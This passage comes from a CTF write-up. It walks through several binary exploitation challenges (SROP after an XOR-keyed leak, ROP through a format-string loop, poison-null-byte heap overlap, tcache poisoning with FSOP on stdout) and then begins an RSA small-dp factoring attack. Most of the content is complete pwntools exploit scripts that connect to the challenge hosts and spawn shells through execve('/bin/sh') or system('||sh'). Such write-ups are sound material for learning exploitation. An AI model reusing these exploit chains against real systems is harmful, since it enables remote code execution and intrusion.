###1. The XOR twist

We don’t control `buffer` directly. Data flows as:

```text
our_input -> ptr (heap) --XOR with seal--> ptr -> memcpy -> buffer (stack)
```

So:

```text
buffer[i] = our_input[i] ^ seal[i % 8]
```

If we want a desired byte `D[i]` on the stack, we need to send:

```text
our_input[i] = D[i] ^ seal[i % 8]
```

Since we already recovered all 8 bytes of `contract_seal` (which is `system`), we know the XOR key:

```python
key = p64(system_leak)  # 8-byte repeating key
```

Now we can **pre‑XOR** a desired stack image to get the correct input payload.


##### ROP vs SROP – Why We Use Sigreturn

We want to eventually call:

```c
system("/bin/sh");
```

or perform an equivalent `execve("/bin/sh", 0, 0)`.

Given ASLR and PIE, we only know libc base (from the system leak). We must build a ROP chain **inside libc**.

Looking for a classic ROP chain (`pop rdi; ret` → `system("/bin/sh")`) is hard in this libc/gadget set and/or in the challenge’s intended solution. Instead, we use **SROP (Sigreturn-Oriented Programming)**, which works well when:

- We know libc base.
- We can find:
  - A `syscall` instruction.
  - A gadget to set `RAX = 15` (the `rt_sigreturn` syscall number).
- We can build a valid `sigreturn` frame on the stack.

##### Useful libc gadgets

In this provided `libc.so.6` we can find:

- A misaligned gadget that acts as **`pop rax; ret`** at offset `0xDD237`:

  ```text
  libc_base + 0xDD237  =>  pop rax; ret
  ```

- A `syscall` instruction at offset `0x288B5`:

  ```text
  libc_base + 0x288B5  =>  syscall
  ```

- The string `"/bin/sh"` at offset found by searching:

  ```python
  BINSH_OFF = next(libc.search(b"/bin/sh"))
  # e.g. 0x1cb42f
  ```

So at runtime:

```python
pop_rax_ret = libc_base + 0xDD237
syscall     = libc_base + 0x288B5
binsh       = libc_base + BINSH_OFF
```


##### SROP idea

We craft an **ROP sequence** on the stack:

1. Overwrite RIP with `pop_rax_ret`
2. Next 8 bytes: `0xf` (the syscall number for `rt_sigreturn`)
3. Next 8 bytes: `syscall` (the gadget that will invoke `syscall`)
4. Immediately after that, in memory, we place a `SigreturnFrame` structure that sets:

   ```text
   rax = 59                # SYS_execve
   rdi = binsh             # pointer to "/bin/sh"
   rsi = 0
   rdx = 0
   rip = syscall           # after sigreturn, do syscall again
   rsp = something safe    # not really used by execve
   ```

Execution:

- When `bomb_devils_contract` returns, it jumps to `pop_rax_ret`.
- `pop_rax_ret` pops the next QWORD into `rax` → `rax = 0xf`.
- Then `ret` jumps to the next QWORD → `syscall`.
- That `syscall` executes `rt_sigreturn`, which **restores registers from the frame** we placed on the stack.
- Now:
  - `rax = 59` (`execve`)
  - `rdi = binsh`
  - `rsi = 0`
  - `rdx = 0`
  - `rip = syscall`
- The CPU jumps to `syscall` again → executes `execve("/bin/sh", 0, 0)` → **shell**.


####  Building the Final Payload

We first build the **desired** 0x200‑byte stack image `desired` as if there were no XOR:

```python
offset_to_ret = 0x58  # from buffer start to saved RIP

from pwn import SigreturnFrame

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = 0

desired  = b'A' * offset_to_ret
desired += p64(pop_rax_ret)  # overwritten RIP
desired += p64(0xf)          # rax = rt_sigreturn
desired += p64(syscall)      # syscall; triggers sigreturn
desired += bytes(frame)      # sigreturn frame

desired = desired.ljust(0x200, b'\x00')  # Bomb Devil copies full 0x200
```

Now we encode it with the repeating 8‑byte key:

```python
key = p64(system_leak)  # 8 bytes from the info leak

encoded = bytearray()
for i in range(len(desired)):
    encoded.append(desired[i] ^ key[i % 8])
payload = bytes(encoded)
```

We send this `payload` to the Bomb Devil when prompted:

```text
[BOMB DEVIL] Infuse your energy into the contract:
```


####  Solve

Below is the full pwntools script that implements everything:

- Leaks `system` via Control + War devils.
- Computes libc base.
- Builds SROP payload considering XOR.
- Gets a shell.

```python
#!/usr/bin/env python3
from pwn import *

# ------------------------------------------------------------
# Config
# ------------------------------------------------------------

binary_path = './chal_chainsawman'
libc_path   = './libc.so.6'
ld_path     = './ld-linux-x86-64.so.2'

context.binary = ELF(binary_path, checksec=False)
context.arch   = 'amd64'
context.os     = 'linux'
context.log_level = 'info'

elf  = context.binary
libc = ELF(libc_path, checksec=False)

HOST = 'remote.infoseciitr.in'
PORT = 8005

# Offsets inside the provided libc.so.6
SYSTEM_OFF   = libc.sym['system']                  # 0x58750 for this libc
BINSH_OFF    = next(libc.search(b'/bin/sh'))       # 0x1cb42f

# Manually found gadgets in this specific libc build
POP_RAX_RET_OFF = 0xDD237  # misaligned: 58 c3 → pop rax ; ret
SYSCALL_OFF     = 0x288B5  # syscall


# ------------------------------------------------------------
# Helpers
# ------------------------------------------------------------

def start():
    """
    Start local process (with given ld & libc) or remote.
    Use:
      python3 solve_pwn1.py LOCAL
      python3 solve_pwn1.py      # remote
    """
    if args.LOCAL:
        return process(
            [ld_path, "--library-path", ".", binary_path],
            env={"LD_PRELOAD": libc_path}
        )
    else:
        return remote(HOST, PORT)


def leak_system_key(io):
    """
    Use CONTROL DEVIL (Makima) + WAR DEVIL (Yoru) to leak the
    8-byte contract_seal (which is exactly system@libc).
    """
    # -----------------------------
    # CONTROL DEVIL: low 4 bytes
    # -----------------------------
    io.recvuntil(b"[CONTROL DEVIL] Submit to her control: ")

    payload0 = b'A' * 4
    io.send(payload0)

    io.recvuntil(b"[CONTROL DEVIL] Your dominated essence: ")
    leak0 = io.recvn(4)
    try:
        io.recvline()
    except EOFError:
        pass

    key0 = xor(leak0, payload0)
    log.info(f"key0 (low 4 bytes): {key0.hex()}")

    # -----------------------------
    # WAR DEVIL: high 4 bytes
    # -----------------------------
    io.recvuntil(b"[WAR DEVIL] Offer your tribute to War: ")

    payload1 = b'B' * 4
    io.send(payload1)

    io.recvuntil(b"[WAR DEVIL] Your war essence: ")
    leak1 = io.recvn(4)
    try:
        io.recvline()
    except EOFError:
        pass

    key1 = xor(leak1, payload1)
    log.info(f"key1 (high 4 bytes): {key1.hex()}")

    key = key0 + key1              # 8 bytes, little-endian
    system_leak = u64(key)
    log.success(f"Leaked system address: {hex(system_leak)}")

    return system_leak, key


def build_srop_payload(libc_base, key):
    """
    Build the 0x200-byte payload for Bomb Devil, already XOR-encoded with key.
    libc_base comes from the system leak.
    key is the 8-byte XOR key (system address bytes).
    """
    # Resolve gadgets and useful addresses
    pop_rax_ret = libc_base + POP_RAX_RET_OFF
    syscall     = libc_base + SYSCALL_OFF
    binsh       = libc_base + BINSH_OFF

    log.info(f"libc base        : {hex(libc_base)}")
    log.info(f"pop rax; ret     : {hex(pop_rax_ret)}")
    log.info(f"syscall          : {hex(syscall)}")
    log.info(f"'/bin/sh' string : {hex(binsh)}")

    # SigreturnFrame is available directly from pwntools
    frame = SigreturnFrame()
    frame.rax = 59          # SYS_execve
    frame.rdi = binsh       # "/bin/sh"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall     # 2nd syscall → execve
    frame.rsp = 0           # doesn't matter, execve doesn't return

    # Stack layout inside bomb_devils_contract:
    #   buffer at [rbp-0x50]
    #   saved RBP at [rbp]
    #   saved RIP at [rbp+8]
    # memcpy(buffer, heap, 0x200) → overflow by 0x1b0 bytes
    offset_to_ret = 0x58    # from start of buffer to saved RIP

    desired  = b'A' * offset_to_ret
    desired += p64(pop_rax_ret)  # overwritten return address
    desired += p64(0xf)          # rax = SYS_rt_sigreturn
    desired += p64(syscall)      # syscall; with rsp pointing at frame
    desired += bytes(frame)      # SigreturnFrame on stack

    # Bomb Devil copies exactly 0x200 bytes
    desired = desired.ljust(0x200, b'\x00')

    # Encode with repeating 8-byte key (system address bytes)
    assert len(key) == 8
    encoded = bytearray()
    for i in range(len(desired)):
        encoded.append(desired[i] ^ key[i % 8])

    return bytes(encoded)


# ------------------------------------------------------------
# Main exploit
# ------------------------------------------------------------

def main():
    io = start()

    # Just let leak_system_key drive the initial menu/banner.
    system_leak, key = leak_system_key(io)

    # Compute libc base from leaked system
    libc_base = system_leak - SYSTEM_OFF
    log.success(f"Computed libc base: {hex(libc_base)}")

    # After WAR DEVIL, story text → Bomb Devil
    io.recvuntil(b"[BOMB DEVIL] Infuse your energy into the contract: ")

    # Build and send 0x200-byte payload
    payload = build_srop_payload(libc_base, key)
    assert len(payload) == 0x200
    io.send(payload)

    # Drop to interactive shell
    io.interactive()


if __name__ == '__main__':
    main()

```
FLAG: `flag{1've_n3ver_g0n3_t0_sch00l_eith3r!}`

### Aladdin ka Chirag

#### Description

what's your wish?

#### Analysis

- checksec: The binary has no canary
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Reverse engineering: The program logic is quite simple, as it has a single ```cave()``` function that allows us to read into two buffers on the stack: ```buf``` and ```s```

- Vulnerabilities: The function ```cave()``` has two vulnerabilities:

    1. Stack overflow: It allocates 8 bytes for ```s```, but allows us to write upto 18 bytes to it. Hence, it is possible to overwrite saved rbp and 2 lowest bytes of the return address
    2. Format string bug: It calls ```printf(buf)``` with buf being a user controlled buffer

#### Exploitation

- The first thing to mention is that if we can execute ```cave()``` only once, it is impossible to get a working exploit as despite the two bugs, we do not have any leak at first. Therefore, it is important to use the stack overflow vulnerability to create a loop, in which we can execute the ```cave()``` function many times. The approach that I opt for is overwriting the lowest byte of the return address from D2 to B0, which allows us to jump to the beginning of ```main()```.

- From now, there are different paths that we can follow, as we have a powerful format string vulnerability (note that the payload string can be upto 24 bytes). However, I accidentally found a seemingly easier ROP approach, because I see some of my addresses "stacked" up as return addresses consecutively.

- My approach is generally as follows: First, I leak libc using the format string bug. After every ```cave()``` calls, we need to always overwrite the last byte of the return address to B0 to loop back to main. The next thing that I notice is in the beginning of main, there are 2 instructions
```asm
push    rbp
mov     rbp, rsp
```

- Since the saved rbp is under our control, then we can push it back on the stack at the beginning of main. Another good thing is that we do not need to worry about it being a legitimate stack address as it will always be overwritten with rsp afterwards.
- Finally, we simply put our ROP gadgets at the positions of saved rbp to achieve a chain

```python
#!/usr/bin/env python3

from pwn import *
libc = ELF('./libc.so.6')
p = remote('remote.infoseciitr.in', 8007)

def leak_libc():
    p.sendafter(b'name >>', b'A' * 16 + b'\xb0')
    p.sendafter(b'wish >> ', b'%11$llx\0')
    libc_leak = p.recvline().strip().decode()
    return int('0x' + libc_leak, 16) - 0x2a1ca

# Leak libc
libc_base = leak_libc()
log.info(f'libc_base: {hex(libc_base)}')

# Calculating addresses
pop_rdi = libc_base + 0x10f78b
pop_rsi = libc_base + 0x110a7d
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']

# ROP
p.sendafter(b'name >>', b'A' * 8 + p64(system) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(0) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(pop_rsi) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(binsh) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)
p.sendafter(b'name >>', b'A' * 8 + p64(pop_rdi) + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)

# Padding so that when we end the loop, ROP will start at pop_rdi
p.sendafter(b'name >>', b'A' * 8 + b'A' * 8 + b'\xb0')
p.sendafter(b'wish >> ', b'A' * 8)

# Send this to end the loop
p.sendafter(b'name >> ', b'A')
p.sendafter(b'wish >> ', b'A')

p.interactive()
```

### Santa's Workshop

#### Description

Explore Santa's magical gift workshop and uncover the mysteries of the North Pole. Ho Ho Ho!

We are given a Google Drive link with the binaries ```chall```, ```libc.so.6``` and ```ld-linux-x86-64.so.2```

#### Analysis

- checksec: All the mitigations are used
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

- Reverse engineering: The binary allows us to perform various actions on the heap including
    
    1. malloc a chunk of size in range (0x50 and 0x1000)
    2. write to a chunk
    3. read from a chunk
    4. free the chunk (and the pointer and size are nulled as well so no use-after-free)
    5. master-key: check if our input matches a random 16 bytes from /dev/urandom, can only be called after load-secret. If it matches, print the flag
    6. load-secret: generate 16 random bytes and store them on the heap and a global variable.

- The main goal of us now is to somehow leak the secret random 16 bytes on the heap/ on the global variable to achieve win()

- Vulnerabilities: There are two main vulnerabilities in this binary

    1. Free heap leak: The binary freely gives us the heap address at the beginning
    2. Off by one null byte (poison null byte). At address 1A3E, the byte after our input is set to null. As our input can reach the final byte of the corresponding heap chunk, we can null out a single byte in the next chunk (which is the least significant byte of the ```size``` field). This situation is commonly known as poison null byte.

#### Exploitation

- Using poison null byte technique, combining with the ability to malloc, free, read and write to chunk, we can achieve the overlapping chunks as detailed in https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c

- By doing so, we can call load-secret with the chunk storing the secret be the same as a chunk of us, which allows secret leaking.

```python
#!/usr/bin/env python3

from pwn import *


p = remote('remote.infoseciitr.in', 8000)

def malloc(id, sz):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.sendlineafter(b'Size: ', str(sz).encode())

def free(id):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Slot: ', str(id).encode())

def read(id, sz):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.recvuntil(b'Contents: ')
    return p.recv(sz)

def write(id, payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Slot: ', str(id).encode())
    p.sendafter(b'Message: ', payload)

# Leak heap
p.recvuntil(b'Ho...Ho...Ho..')
heap_base = int(p.recvline().strip().decode(), 16)
log.info(f"Heap_leak: {hex(heap_base)}")

# Off by one null byte -> overlapping chunks
malloc(0, 0x58)
malloc(1, 0x4f8)
malloc(2, 0x50)
write(0, p64(heap_base + 0x20) + p64(0x51) + p64(heap_base + 0x8) + p64(heap_base + 0x10) + b'A' * 0x30 + p64(0x50))
free(1)

# Load secret
p.sendlineafter(b'> ', b'6')

# Leak secret
secret = read(0, 32)[16:]
log.info(f"Secret: {secret}")

# Submit secret
p.sendlineafter(b'> ', b'5')
p.sendafter(b'Code: ', secret)

p.interactive()
```

### The Last Duel

#### Description

Can you survive the duel, and bring back flag to your homeland?

#### Analysis

##### Overview

The binary contains:
- An array `spells[8]` of pointers to dynamically allocated buffers
- A menu for operating on indices `0..7`
- A global array of constant spell names

  ```c
  const char *spell_texts[8] = {
      "Fireball",
      "Rasengan",
      "AvadaKedavra",
      "Kamehameha",
      "Expelliarmus",
      "arcane_blast_of_the_void!",
      "LIGHT",
      "DARK"
  };
  ```

##### Vulnerability

When choosing **Learn spell** (menu 1), the program has a heap overflow bug:

  ```c
  int learn_spell(int idx)
  {
      int r = rand() % 8;
      const char *text = spell_texts[r];      // fixed internal string

      printf("guess: ");
      char user_pattern[0x100];
      read_line(user_pattern, 0x100);         // your input

      int pos = 0;
      int res = mini_regex_match(text, user_pattern, &pos);
      if (res < 0)
          return -1;

      // BUG: res is *position* in text, not length, but used as malloc size
      void *ptr = malloc(res);
      // BUG: memcpy size is strlen(text) or similar, not bounded by res
      memcpy(ptr, user_pattern, strlen(text));

      spells[idx] = ptr;
  }
  ```

  **Core Bug**: `mini_regex_match` returns the match position in text, which is used as `malloc` size. However, the copy size is based on the full spell name length, creating a heap overflow that overwrites chunk metadata.

**Other Menu Options**:
- **Forget spell** (3): `free(spells[idx])`
- **Remember spell** (4): Prints spell content - can leak heap/libc from freed chunks
- **Special spell** (5): Custom `malloc`/`memcpy` for precise metadata overwrite
- **Menu 6**: Exit path with two `malloc(0xe8)` calls + stdout cleanup → FSOP target via `_IO_2_1_stdout_`

##### RNG Control

The game uses `rand() % 8` to select spells. We need specific lengths:
- `"arcane_blast_of_the_void!"` (index 5, length 0x19)
- `"Rasengan"` (index 1, length 0x8)

**RNG Synchronization**:
```python
libll = CDLL('./libc.so.6')
libll.srand(time.time())
```

Use **dodge** (menu 2) to burn `rand()` calls until we get the desired spell index, making behavior deterministic.

##### Heap Overflow Technique

**Vulnerable Code**:
```c
res = mini_regex_match(text, pattern, &pos);  // res = match position
ptr = malloc(res);                              // small allocation
memcpy(ptr, pattern, strlen(text));             // large copy → overflow
```

**Attack Pattern**: Use regex patterns to control both allocation size and overflow content:
```python
payload = b'.?' * 0x0c + p8(0x21) + b'?'  # Sets next chunk size to 0x21
```

This creates controlled overflows into adjacent chunk metadata.

##### Information Leaks

**Heap Base Leak**:
- Free a tcache chunk: `fd = heap_base >> 12` (safe-linking with NULL next)
- Use `remember` to read freed chunk contents
- Extract and decode: `heap_base = (leaked_fd << 12)`

**Libc Base Leak**:
- Create fake unsorted bin chunk (size 0xa1)
- When freed, contains `main_arena` pointers
- Small allocation + `remember` reveals libc address
- Calculate: `libc_base = leak - main_arena_offset`

##### Exploit Strategy

**1. Leak Information**:
- Heap base: `heap_base = (fd_leak << 12)`
- Libc base: `libc_base = main_arena_leak - 0x203bb0`

**2. Prepare 0xf0 Chunks**:
- Create and free two 0xf0-sized chunks for tcache poisoning
- Menu 6 will allocate `malloc(0xe8)` twice → uses our corrupted tcache

**3. Tcache Poisoning**:
- Safe-linking: `fd = (chunk_addr >> 12) ^ target`
- Target: `_IO_2_1_stdout_`
- Overflow first 0xf0 chunk's `fd` to point to stdout

##### Tcache poisoning with safe‑linking

We use the **special spell** (menu 5) to overwrite the first 0xf0 chunk’s header (which includes the `fd` pointer stored by tcache).

Safe‑linking formula in glibc 2.32+:

```c
fd = PROTECT_PTR(chunk_addr, target) = ((uintptr_t)chunk_addr >> 12) ^ target;
```

So if we want `fd` to point to `target = &_IO_2_1_stdout_`, we must store:

```c
fd = ((chunk_addr >> 12) ^ target);
```

We know:

- `chunk_addr` ≈ `heap_base + 0x400` (from heap layout we observed).
- `target` = `_IO_2_1_stdout_`.

In the exploit:

```python
stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
mangled = stdout_addr ^ ((heap_base + 0x400) >> 12)

payload = b"A" * 0x18 + p64(0xf1) + p64(mangled)
special(5, 0x28, payload)
```

This overwrites the chunk header for the first 0xf0 tcache entry:

- `prev_size` (ignored)
- `size = 0xf1` (0xf0 used size + inuse bit)
- `fd = mangled`.

Now, when the program later asks for `malloc(0xe8)`:

1. The first returned pointer will be that corrupted chunk (we ignore its content).
2. The second `malloc(0xe8)` will follow its `fd`, which now points to `_IO_2_1_stdout_`.

Thus, the second allocation from menu 6 returns a pointer **right into the `stdout` FILE structure**, letting us **overwrite it**.

##### FSOP: hijacking stdout

Once `malloc` returns `_IO_2_1_stdout_`, the code expects a normal heap chunk and later copies user‑controlled data into it. We craft a fake `FILE` structure that, when glibc does stream operations (printing, flushing, closing) on stdout at program exit, will end up calling `system("||sh")`.

In pwntools, building a `FILE` structure is straightforward:

```python
from pwn import FileStructure

_IO_2_1_stdout_ = stdout_addr
system_addr = libc_base + libc.symbols['system']

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b'||sh') << 32)  # magic + "||sh"
fp._IO_read_end = system_addr
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20

payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
```

Here:

- `fp.flags` is set to a standard `stdout` read/write flag pattern (`0xfbad2484`) plus an encoded `"||sh"` in the upper bits, used as the argument to `system`.
- `fp._IO_read_end` is abused to hold the address of `system`.
- `fp.vtable` points inside `_IO_wfile_jumps`, but shifted such that one of the early virtual calls ends up using our crafted pointers.

Finally we send it during menu 6 interaction:

```python
sa(b">> ", b"6")         # choose option 6 (exit)
sa(b">> ", b"A" * 8)     # satisfy some read for the first malloc
sa(b">> ", payload)      # overwrite stdout with our fake FILE
```

During program termination, glibc performs cleanup / flush on `stdout`, hits the corrupted vtable, and effectively executes:

```c
system("||sh");
```

#### Solve

Below is the final exploit script used to solve the challenge, combining all of the steps above:

- RNG synchronization and steering `rand()%8` via `dodge`.
- Heap layout manipulation for heap leak.
- Fake unsorted bin and libc leak.
- Tcache poisoning with safe‑linking.
- FSOP on `_IO_2_1_stdout_` to get `system("||sh")`.

```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import math, time

# ----------------------------------------------------------------------
# Setup
# ----------------------------------------------------------------------
exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6')
context.binary = exe
context.log_level = 'info'

HOST = 'remote.infoseciitr.in'
PORT = 8006

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        # run with the provided loader + libc locally
        return process(['./ld-linux-x86-64.so.2', '--library-path', '.', exe.path])

# shorthand
def s(data):              p.send(data)
def sa(delim, data):      p.sendafter(delim, data)
def sl(data):             p.sendline(data)
def sla(delim, data):     p.sendlineafter(delim, data)
def rcu(delim):           return p.recvuntil(delim)

# ----------------------------------------------------------------------
# Menu wrappers
# ----------------------------------------------------------------------
def learn(idx, guess, spell_len):
    """
    Menu 1: Learn the spell

    The binary does: val = rand() % 8; spell = spells[val];
    We want a specific spell length to control memcpy size:

      spell_len == 0x19 -> index 5: "arcane_blast_of_the_void!" (len 25)
      spell_len == 0x8  -> index 1: "Rasengan"                (len 8)

    We keep calling "dodge" (menu 2) until rand()%8 hits the index we want.
    """
    if spell_len == 0x19:
        target = 5
    elif spell_len == 0x8:
        target = 1
    else:
        raise ValueError("unexpected spell_len")

    val = libll.rand() % 8
    while val != target:
        dodge()              # menu 2, burns one rand()
        val = libll.rand() % 8

    sa(b'>> ', b'1')
    sla(b'>> ', str(idx).encode())
    sla(b'guess: ', guess)

def dodge():
    sa(b'>> ', b'2')

def forget(idx):
    sa(b'>> ', b'3')
    sla(b'>> ', str(idx).encode())

def remember(idx):
    sa(b'>> ', b'4')
    sla(b'>> ', str(idx).encode())

def special(idx, size, spell):
    sa(b'>> ', b'5')
    sla(b'>> ', str(idx).encode())
    sla(b'>> ', str(size).encode())
    sla(b'spell: ', spell)

# ----------------------------------------------------------------------
# Main exploit
# ----------------------------------------------------------------------
p = start()

# local copy of the SAME libc used by the binary, for rand() predict
libll = CDLL('./libc.so.6')
now = int(math.floor(time.time()))
libll.srand(now)

# ----------------------------------------------------------------------
# 1) Heap leak via tcache entry
# ----------------------------------------------------------------------
payload = b'.?' * 0x0c + p8(0x21) + b'?'

for i in range(0, 3):
    learn(i, payload, 0x19)
for i in range(3, 8):
    learn(i, payload, 0x19)

forget(0)
payload2 = b'.?' * 0x0c + p8(0x31) + b'?'
learn(0, payload2, 0x19)
forget(2)
remember(1)

rcu(b"spell >> ")
p.recvn(0x20)
heap_leak = u64(p.recvn(8))
heap_base = heap_leak << 12
log.info(f'heap_base = {heap_base:#x}')

# ----------------------------------------------------------------------
# 2) Fill tcache for size 0xa0 to avoid consolidation issues
# ----------------------------------------------------------------------
forget(0)
payload = b'.?' * 0x0c + p8(0x21) + b'?'
learn(0, payload, 0x19)
learn(2, payload, 0x19)

for i in range(6, -1, -1):
    forget(i)
    payload = b'.?' * 0x0c + p8(0xa1) + b'?'
    learn(i, payload, 0x19)
    forget(i + 1)

    # restore original layout
    forget(i)
    payload = b'.?' * 0x0c + p8(0x21) + b'?'
    learn(i, payload, 0x19)

for i in range(1, 8):
    payload = b'.?' * 0x0c + p8(0x21) + b'?'
    learn(i, payload, 0x19)

# ----------------------------------------------------------------------
# 3) Libc leak via fake unsorted bin
# ----------------------------------------------------------------------
forget(1)
payload = b'.?' * 0x0c + p8(0xa1) + b'?'
learn(1, payload, 0x19)
forget(2)           # this becomes a (fake) unsorted-bin chunk

# prepare two 0xf0 tcache chunks
forget(4)
payload = b'.?' * 0x0c + p8(0xf1) + b'?'
learn(4, payload, 0x19)
forget(5)           # tcache[0xf0] entry 0

forget(3)
payload = b'.?' * 0x0c + p8(0xf1) + b'?'
learn(3, payload, 0x19)
forget(4)           # tcache[0xf0] entry 1

# leak libc from the unsorted-bin chunk at index 2
payload = b'.?' * (0x8 // 2)
learn(2, payload, 0x8)
remember(2)

rcu(b"spell >> ")
p.recvn(0x8)
libc_leak = u64(p.recvn(8))
libc_base = libc_leak - 0x203bb0      # 0x203bb0 = main_arena + 0xf0 in this libc
log.info(f'libc_base = {libc_base:#x}')

# ----------------------------------------------------------------------
# 4) Tcache poisoning for 0xf0 chunks → target _IO_2_1_stdout_
# ----------------------------------------------------------------------
stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
system_addr = libc_base + libc.symbols['system']

# safe-linking: PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr
# here pos is roughly heap_base + 0x400 for the first 0xf0 tcache entry
mangled = stdout_addr ^ ((heap_base + 0x400) >> 12)
payload = b"A" * 0x18 + p64(0xf1) + p64(mangled)

# write into tcache entry using add_special_spell
special(5, 0x28, payload)

# ----------------------------------------------------------------------
# 5) FSOP on stdout via the exit path (menu 6)
# ----------------------------------------------------------------------
sa(b'>> ', b'6')
# first malloc(0xe8) – data not important
sa(b'>> ', b'A' * 8)

_IO_2_1_stdout_ = stdout_addr

# Build fake FILE structure for stdout
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b'||sh') << 32)    # "||sh" as part of flags
fp._IO_read_end = system_addr                   # call system()
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20

payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
sa(b'>> ', payload)

p.interactive()
```

## Cryptography
### bolt_fast

#### Description

Everyone keeps telling me to worry about Wiener's attack, but they just don't understand optimization. Don't bother checking my key size; it's huge. You'll never catch me! Hahahaha!

#### Analysis

The challenge provides RSA key generation code with a critical vulnerability in creating the $d_p$ parameter (CRT exponent).

#### Vulnerable Code:

```python
# The vulnerability is here:
dp_smart = getPrime(16)
e = inverse(dp_smart, p-1)
```

#### Weakness:

In standard RSA CRT (Chinese Remainder Theorem), $d_p$ is calculated as:
$$d_p \equiv d \pmod{p-1} \equiv e^{-1} \pmod{p-1}$$

Normally, $d_p$ should be approximately the same size as $p$ (around 1024 bits). However, the challenge uses `getPrime(16)`, meaning $d_p$ is only a **16-bit** prime number.

Range of values for $d_p$:
$$2^{15} < d_p < 2^{16} \implies 32,768 < d_p < 65,536$$

Due to the extremely small key space (only a few thousand prime numbers), we can perform a **Brute-force attack** to find $d_p$.

---

#### Mathematical Derivation

The goal is to find the prime factor $p$ from $N$ and $e$ when we know (or can guess) $d_p$.

1.  From the definition $d_p \equiv e^{-1} \pmod{p-1}$, we have:
    $$e \cdot d_p - 1 = k \cdot (p-1)$$
    This means $(e \cdot d_p - 1)$ is a multiple of $(p-1)$.

2.  According to **Fermat's Little Theorem**, for any integer $a$ (choose $a=2$):
    $$a^{p-1} \equiv 1 \pmod p$$

3.  Substituting, we get:
    $$a^{e \cdot d_p - 1} \equiv 1 \pmod p$$
    $$\Rightarrow p \mid (a^{e \cdot d_p - 1} - 1)$$

4.  Since $p$ is also a divisor of $N$, we can find $p$ by calculating the **Greatest Common Divisor (GCD)**:
    $$p = \text{GCD}(a^{e \cdot d_p - 1} - 1 \pmod N, N)$$

---

#### Solve

The script below doesn't require external libraries (like `pycryptodome`), and can be run directly with Python 3.

```python
import math
import sys

# --- CHALLENGE DATA ---
N = 22061149554706951873851465765917042279909309233484615798640186468876401527123242297915465375459511054772541825273007749026648641620485458471351811298443479262277231839408201654282927999029324652496830649919637863202844794784443579336735415046336390091671003022244732389217910334465895328371360158510046347031294125509649474722535171601096998732929497780870057433634214228116293166963101489644680801538837005001377764416442380530464289453201654394144682138927826247301956954884930328147978637795259346321547054237005318172528896865428457293207571804464061990459958593520373578234234490804585522859401957032395007142007
e = 9648003423571638489624579625383119603270189664714210175737275695548206153582516635644990660189908448510652756058045483763071850222529184219333877863638216254054444012130393864033392161426815671725858723096432660521038315432183692553568344247916320931122090436770154203149432285380142051084178668290839858171
c = 18817014323644102879407569381912044887671193778381872592373573382139976320220125847317309926920208859012582031032930373240219755720268543444729983316326640661427616841700761054678137741340093140586895094016730198447552611014038632666821117758006775144046000049080406858764900680265384743839472653817299383323869146152251839342236631780818396088131196202767951301023089053662813175083035336272981588533957561537975684034210166185396046071368061264321959248372783262788158418696375783427276741258526067168910326630496339287237940444426277757582174810909733937257258767407189452212391936958267819666424558678534741723930

# --- MATH HELPER FUNCTIONS ---

# 1. Extended Euclidean Algorithm (Calculate modular inverse)
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('Modular inverse does not exist')
    else:
        return x % m

# 2. Convert Long to Bytes (Crypto library replacement)
def long_to_bytes(val, endianness='big'):
    width = val.bit_length()
    width += 8 - ((width % 8) or 8)
    fmt = '%%0%dx' % (width // 4)
    s = bytes.fromhex(fmt % val)
    return s

# 3. Sieve of Eratosthenes (Generate list of prime numbers)
def sieve(limit):
    is_prime = [True] * (limit + 1)
    is_prime[0] = is_prime[1] = False
    for p in range(2, int(math.sqrt(limit)) + 1):
        if is_prime[p]:
            for i in range(p * p, limit + 1, p):
                is_prime[i] = False
    return [p for p in range(limit + 1) if is_prime[p]]

# --- ATTACK LOGIC ---

def solve():
    print("[*] STEP 1: Generating 16-bit primes...")
    # dp_smart is 16-bit, so max value is 65536
    primes = sieve(65536)
    
    # Filter primes that fit getPrime(16) -> [2^15, 2^16]
    candidates = [p for p in primes if p >= (1 << 15)]
    print(f"[*] Found {len(candidates)} candidates for dp.")

